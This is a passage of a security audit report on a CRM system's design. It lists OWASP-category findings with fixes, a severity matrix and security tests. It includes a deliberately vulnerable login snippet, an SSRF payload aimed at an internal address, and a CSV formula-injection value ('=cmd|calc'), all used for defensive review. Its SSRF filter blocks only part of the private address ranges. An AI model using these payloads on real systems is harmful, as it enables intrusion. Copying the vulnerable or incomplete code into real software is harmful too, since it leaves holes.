But does NOT show implementation. If code differentiates:

```typescript
// VULNERABLE
const user = await this.usersRepository.findByEmail(email);
if (!user) {
  return { error: 'User not found' }; // Attacker learns email doesn't exist
}

const isValid = await bcrypt.compare(password, user.passwordHash);
if (!isValid) {
  return { error: 'Invalid password' }; // Attacker knows email exists
}
```

**Recommended Fix:**
```typescript
// auth.service.ts
async login(email: string, password: string) {
  const user = await this.usersRepository.findByEmail(email);

  const isValid = user ? await bcrypt.compare(password, user.passwordHash) : false;

  if (!user || !isValid) {
    // Same generic error, always delay by random amount to prevent timing attack
    await this.delay(100 + Math.random() * 200);
    throw new UnauthorizedException('Invalid credentials');
  }

  // Check if user is active
  if (user.status === UserStatus.INACTIVE) {
    throw new UnauthorizedException('Invalid credentials'); // Don't reveal reason
  }

  // ... generate tokens
}
```

---

#### **[HIGH] No Account Lockout After Failed Attempts** (NEW)

**Severity:** HIGH
**Status:** Not addressed

**Description:**
No mention of brute-force protection beyond rate limiting. If attacker has valid IP (or bypasses rate limit via proxy rotation), can attempt unlimited passwords.

**Recommended Fix:**
```typescript
// auth.service.ts
async login(email: string, password: string, ipAddress: string) {
  // Check failed attempts
  const failures = await this.failedLoginRepository.countRecent(email, ipAddress, 15 * 60 * 1000); // Last 15 min

  if (failures >= 5) {
    throw new TooManyRequestsException('Too many failed attempts. Try again in 15 minutes.');
  }

  const user = await this.usersRepository.findByEmail(email);
  const isValid = user && await bcrypt.compare(password, user.passwordHash);

  if (!user || !isValid || user.status === UserStatus.INACTIVE) {
    // Log failed attempt
    await this.failedLoginRepository.create({
      email,
      ipAddress,
      timestamp: new Date()
    });

    throw new UnauthorizedException('Invalid credentials');
  }

  // Clear failed attempts on success
  await this.failedLoginRepository.clear(email, ipAddress);

  // ... generate tokens
}
```

---

#### **[MEDIUM] Password Change Does Not Invalidate Tokens** (NEW)

**Severity:** MEDIUM
**Status:** Not addressed

**Description:**
If user changes password, existing tokens remain valid (valid until expiry). Attacker with stolen token can still use it even after victim changes password.

**Recommended Fix:**
```typescript
// users.service.ts
async changePassword(userId: bigint, oldPassword: string, newPassword: string) {
  const user = await this.findById(userId);

  const isValid = await bcrypt.compare(oldPassword, user.passwordHash);
  if (!isValid) {
    throw new UnauthorizedException('Current password incorrect');
  }

  const hash = await bcrypt.hash(newPassword, 12);

  await this.prisma.$transaction([
    // Update password
    this.prisma.user.update({
      where: { id: userId },
      data: { passwordHash: hash }
    }),
    // Revoke ALL refresh tokens
    this.prisma.refreshToken.updateMany({
      where: { userId },
      data: { revokedAt: new Date() }
    })
  ]);

  return { message: 'Password changed. Please login again.' };
}
```

---

### A08: Software and Data Integrity Failures

#### **[HIGH] No Code Signing for API Responses** (NEW)

**Severity:** HIGH
**Status:** Not applicable for internal system but worth noting

**Description:**
Not directly applicable (internal system), but if later exposed to external integrations, responses should be signed.

---

#### **[MEDIUM] Uploaded Files Not Virus Scanned** (NEW)

**Severity:** MEDIUM
**Status:** Not addressed

**Description:**
Phase 07 CSV upload does NOT mention virus scanning. Attacker uploads CSV with malicious macros or embedded content.

**Recommended Fix:**
```typescript
// import.service.ts
async uploadLeadsCSV(file: Express.Multer.File) {
  // Validate MIME type (already done)
  // File size check (already done)

  // Scan for malware
  const isMalicious = await this.clamavService.scan(file.buffer);
  if (isMalicious) {
    throw new BadRequestException('File contains malicious content');
  }

  // ... continue
}
```

Or use VirusTotal API.

---

### A09: Security Logging and Monitoring Failures

#### **[HIGH] No Security Event Logging Specified** (NEW)

**Severity:** HIGH
**Status:** Not addressed

**Description:**
Design does NOT specify logging for:
1. Failed login attempts
2. Token refreshes
3. Privilege escalations
4. Role changes
5. Deleted data
6. API key usage
7. Import activity

**Recommended Fix:**
```typescript
// common/filters/http-exception.filter.ts
private logger = new Logger('Security');

// Log all 4xx/5xx errors
this.logger.warn({
  statusCode,
  path: request.url,
  method: request.method,
  userId: request.user?.id,
  timestamp: new Date(),
  duration: Date.now() - request.startTime
});

// auth.service.ts
this.logger.warn('Failed login attempt', { email, ipAddress });
this.logger.log('Token refresh', { userId, newTokenFamily });
this.logger.warn('Role escalation attempted', { userId, attemptedRole });

// users.service.ts
this.logger.warn('User deleted', { userId, deletedBy });

// leads.service.ts
this.logger.log('Lead assigned', { leadId, assignedUserId, assignedBy });
```

---

#### **[MEDIUM] No Rate Limit Monitoring/Alerting** (NEW)

**Severity:** MEDIUM
**Status:** Rate limiting configured, no monitoring mentioned

**Description:**
If rate limits are hit repeatedly, admin should be alerted (potential attack). No mechanism mentioned.

---

### A10: Server-Side Request Forgery (SSRF)

#### **[MEDIUM] Third-Party API Integration No URL Validation** (NEW)

**Severity:** MEDIUM
**Status:** Not addressed

**Description:**
Phase 07 mentions 3rd party lead API but does NOT validate that incoming webhooks/callbacks don't point to internal addresses. If attacker controls external system:

```json
{
  "name": "Malicious",
  "phone": "0912345678",
  "source": "External",
  "webhook": "http://127.0.0.1:5432"
}
```

System might be tricked into making internal request.

**Recommended Fix:**
```typescript
// third-party-api.service.ts
async createLeadFromExternal(dto: ExternalLeadDto) {
  // Validate any URL fields
  if (dto.webhook) {
    const url = new URL(dto.webhook);

    // Reject internal IPs
    if (/^(127\.|10\.|172\.16\.|192\.168\.)/.test(url.hostname) ||
        url.hostname === 'localhost') {
      throw new BadRequestException('Invalid webhook URL');
    }
  }

  // ... create lead
}
```

---

## Business Logic Attack Vectors

### **[CRITICAL] User Cannot Create Leads but Can Circumvent via External API** (NEW)

**Severity:** CRITICAL
**Status:** Partially addressed (external API exists, no role restriction)

**Description:**
Phase 04 restricts POST /leads to MANAGER+ only. But Phase 07 /external/leads endpoint (for 3rd party) might not enforce this. If API key is not restricted to specific departments/permissions:

```
Manager A creates API key (full permissions)
Key leaked to attacker
Attacker uses key to create unlimited leads in any department
```

**Recommended Fix:**
```typescript
// api_keys table: add permissions array
model ApiKey {
  id          BigInt
  permissions String[] @default(["leads:create"]) // Granular permissions
  departmentIds BigInt[] // Restrict to specific depts
}

// third-party-api.service.ts
async createLeadFromExternal(dto: ExternalLeadDto, apiKey: ApiKey) {
  // Verify API key has leads:create permission
  if (!apiKey.permissions.includes('leads:create')) {
    throw new ForbiddenException('API key does not have leads:create permission');
  }

  // If key is department-restricted, enforce it
  if (apiKey.departmentIds.length > 0) {
    if (!apiKey.departmentIds.includes(dto.departmentId)) {
      throw new ForbiddenException('API key not authorized for this department');
    }
  }

  // ... create lead
}
```

---

### **[HIGH] Customer Assignment Not Validated Against User's Department** (NEW)

**Severity:** HIGH
**Status:** Not addressed

**Description:**
Phase 04 mentions "assigned_department_id" on Customer but does NOT enforce that a user can only assign customers to their own department. Regular user might manipulate customer assignment to another dept.

**Recommended Fix:**
```typescript
// customers.service.ts
async update(id: bigint, dto: UpdateCustomerDto, currentUser: User) {
  if (dto.assignedDepartmentId && currentUser.role !== UserRole.SUPER_ADMIN) {
    throw new ForbiddenException('Only super_admin can change customer department');
  }

  return this.prisma.customer.update({
    where: { id },
    data: dto
  });
}
```

---

### **[HIGH] Inactive User Can Still Access Data via Valid Token** (NEW)

**Severity:** HIGH
**Status:** Not addressed

**Description:**
Phase 03 says soft-deleted users cannot login, but does NOT check if a user's status is INACTIVE on protected routes. User A:
1. Logs in successfully
2. Admin marks User A as INACTIVE
3. User A's token is still valid (not revoked)
4. User A continues accessing data until token expires

**Recommended Fix:**
```typescript
// jwt.strategy.ts
async validate(payload: JwtPayload) {
  const user = await this.usersRepository.findById(payload.sub);

  if (!user || user.deletedAt !== null) {
    throw new UnauthorizedException('User not found');
  }

  // CRITICAL: check status
  if (user.status === UserStatus.INACTIVE) {
    throw new UnauthorizedException('Account inactive');
  }

  return user;
}
```

Or better, revoke all tokens on status change:
```typescript
// users.service.ts
async updateStatus(userId: bigint, newStatus: UserStatus) {
  await this.prisma.$transaction([
    this.prisma.user.update({
      where: { id: userId },
      data: { status: newStatus }
    }),
    // Revoke all refresh tokens
    this.prisma.refreshToken.updateMany({
      where: { userId },
      data: { revokedAt: new Date() }
    })
  ]);
}
```

---

### **[MEDIUM] Export Does Not Respect Department Filters** (NEW)

**Severity:** MEDIUM
**Status:** Not addressed

**Description:**
Phase 07 specifies export endpoints but does NOT mention department filtering. If user exports leads:

```
GET /exports/leads?status=POOL
```

Does it export only their dept's leads, or all leads? Design is ambiguous.

**Recommended Fix:**
```typescript
// export.service.ts
async exportLeads(filters: LeadQueryDto, currentUser: User) {
  // Apply department filter
  const query = {
    ...filters,
    departmentId: currentUser.role === UserRole.SUPER_ADMIN
      ? undefined
      : currentUser.departmentId
  };

  const leads = await this.leadsRepository.find(query);
  return this.csvService.generate(leads);
}
```

---

## Summary: Vulnerability Matrix

| Severity | OWASP | Issue | Addressed | Exploit Impact |
|----------|-------|-------|-----------|----------------|
| CRITICAL | A01 | IDOR: Access any lead/customer by ID | NO | Data exfiltration |
| CRITICAL | A01 | Lead dedup not scoped to department | NO | Department boundary breach |
| CRITICAL | A03 | CSV injection via formulas | NO | RCE on user machines |
| CRITICAL | A03 | SQL injection via string interpolation | DESIGN ONLY | Database compromise |
| CRITICAL | A04 | Double assignment race condition | NO | Data inconsistency |
| CRITICAL | A04 | Double claim of customer race condition | NO | Data inconsistency |
| CRITICAL | A05 | CORS wildcard allows credential theft | PARTIAL | Session hijacking |
| CRITICAL | BL | User bypasses lead creation via external API | PARTIAL | Privilege escalation |
| HIGH | A01 | Mass assignment: role escalation | NO | Privilege escalation |
| HIGH | A01 | Manager privilege escalation | NO | Cross-department access |
| HIGH | A01 | Deleted user still in assignments | NO | Orphaned data |
| HIGH | A02 | API key expiration not enforced | PARTIAL | Key reuse |
| HIGH | A02 | Refresh token reuse not detected | PARTIAL | Session hijacking |
| HIGH | A03 | Phone field injection (no type validation) | PARTIAL | XSS/Injection |
| HIGH | A04 | Status transition not validated | DESIGN ONLY | Workflow bypass |
| HIGH | A05 | Rate limit missing on imports (DOS) | NO | Service disruption |
| HIGH | A07 | User enumeration on login | DESIGN ONLY | Account discovery |
| HIGH | A07 | No account lockout | NO | Brute force |
| HIGH | A07 | Password change doesn't revoke tokens | NO | Session persistence |
| HIGH | BL | Customer assignment not validated | NO | Cross-department data |
| HIGH | BL | Inactive user can access via token | NO | Unauthorized access |
| MEDIUM | A02 | Refresh token family reuse silent fail | PARTIAL | Session hijacking |
| MEDIUM | A02 | Bcrypt cost not documented enforcement | PARTIAL | Hash weakness |
| MEDIUM | A02 | JWT algorithm not restricted | NO | Token forgery |
| MEDIUM | A02 | JWT secret strength not validated | NO | Token brute force |
| MEDIUM | A04 | Import duplicate merge strategy unclear | PARTIAL | Data loss |
| MEDIUM | A05 | No security headers | NO | Click-jacking, MIME sniff |
| MEDIUM | A05 | Error messages expose details | PARTIAL | Information disclosure |
| MEDIUM | A06 | Redis not password-protected | NO | Queue manipulation |
| MEDIUM | A06 | No dependency security audit | NO | Supply chain risk |
| MEDIUM | A07 | No brute-force monitoring | NO | Attack detection gap |
| MEDIUM | A10 | 3rd party API no URL validation | NO | SSRF |
| MEDIUM | BL | Export doesn't filter by department | DESIGN ONLY | Data leakage |
| LOW | A02 | Label name not escaped in CSV | PARTIAL | CSV injection variant |

---

## Key Findings Summary

### Addressed in Design (GOOD)
- Soft deletes on CRM entities ✓
- Bcrypt for password hashing ✓
- JWT + refresh token architecture ✓
- Rate limiting framework ✓
- Roles (SUPER_ADMIN, MANAGER, USER) ✓
- Refresh token family tracking ✓
- Phone normalization utility ✓
- API key authentication ✓

### Partially Addressed (INCOMPLETE)
- API key expiration (field exists, no enforcement)
- Refresh token reuse (family ID exists, no revocation logic)
- CSV injection (no sanitization logic)
- Error filtering (mention but no implementation details)
- Department-based access (not enforced in every controller)

### NOT Addressed (CRITICAL GAPS)
- IDOR checks on GET endpoints
- Department-scoped dedup
- Race condition prevention (optimistic locking)
- Status machine validation
- Account lockout
- Security event logging
- CORS hardening
- Password change token revocation
- User status checks on every request
- CSV formula sanitization

---

## Risk Prioritization: Implementation Order

**Phase 0 (BEFORE CODE EXECUTION)**
1. Add department-based access checks to ALL entity GET endpoints
2. Implement optimistic locking for lead assignments
3. Add database unique constraints for phone+source+department
4. Define and enforce status transition state machine

**Phase 1 (SECURITY CRITICAL)**
1. CSV injection sanitization
2. Deleted user handling (cascade safe)
3. User status checks on JWT validation
4. Password change token revocation
5. Account lockout mechanism

**Phase 2 (HIGH RISK)**
1. IDOR tests (automated) for all entity endpoints
2. API key expiration enforcement
3. Refresh token reuse detection + family revocation
4. Rate limiting on imports
5. Security headers

**Phase 3 (AUDIT)**
1. Security event logging
2. Error message sanitization
3. Phone field type validation
4. External API URL validation

---

## Testing Recommendations

### Automated Security Tests
```typescript
// leads.spec.ts
describe('Lead IDOR Prevention', () => {
  it('should reject user accessing lead from different department', async () => {
    const lead = await createLead({ departmentId: 1 });
    const user = createUser({ departmentId: 2 });
    const response = await client
      .get(`/leads/${lead.id}`)
      .auth(user.token)
      .expect(403);
  });

  it('should allow super_admin to access any lead', async () => {
    const lead = await createLead({ departmentId: 1 });
    const admin = createSuperAdmin();
    await client
      .get(`/leads/${lead.id}`)
      .auth(admin.token)
      .expect(200);
  });
});

describe('Race Conditions', () => {
  it('should prevent double assignment', async () => {
    const lead = await createLead({ status: 'POOL' });

    const [res1, res2] = await Promise.all([
      client.post(`/leads/${lead.id}/assign`)
        .auth(manager1.token)
        .send({ userId: user1.id }),
      client.post(`/leads/${lead.id}/assign`)
        .auth(manager2.token)
        .send({ userId: user2.id })
    ]);

    // One succeeds, one fails
    expect([res1.status, res2.status]).toContain(200);
    expect([res1.status, res2.status]).toContain(409);
  });
});

describe('CSV Injection', () => {
  it('should sanitize formula injection', async () => {
    const csv = 'name,phone\n=cmd|calc,0912345678';
    const res = await client
      .post('/imports/leads')
      .attach('file', Buffer.from(csv));

    const lead = await Lead.findOne();
    expect(lead.name).toEqual("'=cmd|calc"); // Prepended quote
  });
});
```

---

## Unresolved Questions

1. **Department Hierarchy**: Can nested departments exist? Does manager A manage department B's sub-departments? Not specified in design.

2. **Lead Pool Visibility**: Can a user see leads in the pool that are outside their department? Design says "manager+ view" but scope unclear.

3. **Order vs Lead**: Can an order be created on a lead without a customer? Design mentions lead→customer conversion but edge cases unclear.

4. **Call Log Matching**: Who can see call logs matched to a lead? Is this restricted by department?

5. **Team vs Department**: A user can be in a team, team is in a department, user has a department. What if they differ? Ambiguous.

6. **API Key Department Scoping**: Phase 02 doesn't define if an API key can be restricted to specific departments. Implementation assumption needed.

7. **Label Access Control**: Can any user create labels or only manager+? Design says "manager+" but not enforced.

8. **Activity Timeline Permission**: Can user A see activity logs on leads they don't own? Not specified.

9. **Soft Delete Cascade**: If a department is soft-deleted, what happens to its leads/users? Design blocks hard delete but not soft delete behavior.

10. **External API Rate Limit**: Is 100 req/min per API key enforced per endpoint or globally? If multiple endpoints exist, does each get 100 or do all share?

---

**Report Generated:** 2026-03-25
**Audit Depth:** Design review (no code implementation audited)
**Confidence Level:** HIGH (based on explicit design specifications)
**Recommendation:** Address CRITICAL findings before implementation; implement MEDIUM findings during code review phase.
